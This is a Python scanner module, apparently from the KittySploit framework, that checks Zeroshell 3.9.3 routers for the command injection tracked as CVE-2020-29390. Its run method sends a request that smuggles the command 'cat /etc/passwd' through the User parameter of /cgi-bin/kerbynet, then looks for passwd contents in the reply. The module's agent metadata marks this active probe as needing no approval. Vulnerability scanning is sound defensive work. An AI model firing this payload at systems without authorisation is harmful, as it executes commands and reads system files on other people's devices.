#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zeroshell 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zeroshell 3.9.3 - Command Injection Detection',
        'description': 'Zeroshell 3.9.3 contains a command injection vulnerability in the /cgi-bin/kerbynet StartSessionSubmit parameter that could allow an unauthenticated attacker to execute a system command by using shell metacharacters and the %0a character.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'zeroshell', 'rce', 'router', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://web.archive.org/web/20210303043709/https://blog.quake.so/post/zeroshell_linux_router_rce/',
            'https://www.exploit-db.com/exploits/41040',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-29390',
        ],
        'cve': 'CVE-2020-29390',
    }

    def run(self):
        path = '/cgi-bin/kerbynet?Action=StartSessionSubmit&User=%27%26cat%20/etc/passwd%26%27&PW='
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<title>Start Session</title>',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Zeroshell 3.9.3 - Command Injection detected', path=path)
            return True
        return False

